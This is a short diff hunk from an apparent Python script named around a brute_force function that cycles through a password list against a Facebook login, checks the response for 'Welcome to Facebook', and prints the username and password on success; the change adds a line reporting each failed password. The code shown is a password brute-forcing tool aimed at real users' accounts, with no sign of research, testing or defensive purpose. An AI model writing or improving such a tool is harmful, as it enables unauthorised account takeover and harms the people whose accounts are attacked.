@@ -13,6 +13,8 @@ def brute_force(username, fb_id, passwords):
             if 'Welcome to Facebook' in result.text:
                 print(f"Login successful! Username: {username}, Password: {password}")
                 break
+            else:
+                print(f"Login failed for Password: {password}")
         except requests.exceptions.RequestException as e:
             print(f"Request Error: {e}")
 
